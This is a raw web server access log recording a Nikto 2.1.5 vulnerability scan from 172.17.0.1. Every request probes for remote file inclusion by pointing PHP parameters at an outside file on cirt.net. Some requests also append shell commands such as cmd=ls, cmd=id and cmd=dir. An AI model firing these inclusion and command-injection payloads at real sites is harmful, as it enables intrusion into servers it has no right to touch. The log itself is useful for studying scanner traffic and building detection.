172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?file_Nikto[]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005089)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?file_name[]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005089)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?file_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005090)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?fileloc=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005091)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?from=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005092)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?func=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005093)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?function=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005094)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?function=custom&custom=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005095)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?gOo=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005096)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?gen=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005097)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?get=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005098)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?home_Nikto=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005099)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?home_name=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005099)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?ilang=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005100)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?inc_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005101)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?inc_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005102)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?includeDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005103)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?includeFooter=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005104)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?includesdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005105)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?insPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005106)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005107)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?language=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005108)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?language=en&main_page=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005109)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?lizge=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005110)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?lng=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005111)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?load=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005112)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?loadpage=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005113)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?main_tabid=1&main_content=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 442 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005114)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?may=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 479 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005115)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?middle=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005116)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?mode=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005117)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?mode=http://cirt.net/rfiinc.txt??&cmd= HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005118)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?modpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005119)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?module=PostWrap&page=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005120)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005121)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?news7[\\\"functions\\\"]=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005122)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?news_include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005123)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?open=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005124)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?option=com_custompages&cpage=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005125)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005126)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?page=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005127)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005128)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?pagehttp://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005129)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005130)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?pageNikto=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005131)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?pagename=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005131)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?pager=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005132)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?pagina=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005133)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?path_to_folder=http://cirt.net/rfiinc.txt??cmd=id HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005134)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?pg=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005135)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?pg=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005136)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005137)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?plugin=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005138)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?principal=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005139)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?proMod=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005140)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?proMod=http://cirt.net/rfiinc.txt??cmd HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005141)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?project=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005142)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?repinc=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005143)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?root_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005144)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?root_prefix=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005145)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?section=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005146)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?site=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005147)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005148)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?styl[top]=http://cirt.net/rfiinc.txt??? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005149)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?template=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005150)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?templates_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005151)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?theme=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005152)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?themepath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005153)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?themesdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005154)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?this_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005155)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?txt=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005156)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?up=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005157)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?url=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005158)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?w=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005159)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index.php?way=http://cirt.net/rfiinc.txt??????????????? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005160)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index1.php?=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005161)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index1.php?inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005162)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index1.php?inhalt=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005163)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index2.php?=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005164)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index2.php?content=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005165)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index2.php?s=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005166)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /index2.php?x=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005167)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /indexinfo.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005168)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /indexk.php?lib_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005169)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /info.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005170)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /inhalt.php?dateien[news]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005171)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /init.php?API_HOME_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005172)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /init.php?scriptpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005173)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /initialize.php?hmail_config[includepath]=http://cirt.net/rfiinc.txt?&cmd=dir HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005174)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /initiate.php?abs_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005175)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /install.php?_NE[AbsPath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005176)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /install.php?install_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005177)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /install/config.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005178)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /install/di.php?pathtoserverdata=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005179)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /install/index.php?content_php=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005180)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /install/install3.php?database=none&cabsolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005181)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /integration/shortstat/configuration.php?SPL_CFG[dirroot]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005182)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /interact/modules/forum/embedforum.php?CONFIG[LANGUAGE_CPATH]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005183)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /interact/modules/scorm/lib.inc.php?CONFIG[BASE_PATH]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005184)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /interface/billing/billing_process.php?srcdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005185)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /interface/editors/-custom.php?bField[bf_data]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005186)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /interface/editors/custom.php?bField[bf_data]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005187)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /interface/new/new_patient_save.php?srcdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005188)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /intern/admin/?rootdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005189)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /intern/admin/other/backup.php?admin=1&rootdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005190)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /intern/clan/member_add.php?rootdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005191)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /intern/config/forum.php?rootdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005192)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /intern/config/key_2.php?rootdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005193)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ip.inc.php?type=1&cgipath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005194)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ipeer_site/?page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005195)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /joinus.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005196)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /joinus.php?vwar_root=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005197)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /joomla_path/administrator/components/com_x-shop/admin.x-shop?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005198)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /joomla_path/components/com_articles.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005199)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /js/bbcodepress/bbcode-form.php?BBCODE_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005200)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /js/wptable-tinymce.php?ABSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005201)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /jscript.php?my_ms[root]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005202)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /kernel/class/ixpts.class.php?IXP_ROOT_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005203)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /kernel/loadkernel.php?installPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005204)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /kmitaadmin/kmitam/htmlcode.php?file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005205)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /kmitaadmin/kmitat/htmlcode.php?file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ktmlpro/includes/ktedit/toolbar.php?dirDepth=http://cirt.net/rfiinc.txt? HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lang/leslangues.php?fichier=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005208)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /lang_english/lang_main_album.php?phpbb_root_path=http://cirt.net/rfiinc.txt??a= HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005209)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /language/lang_english/lang_activity.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005210)"
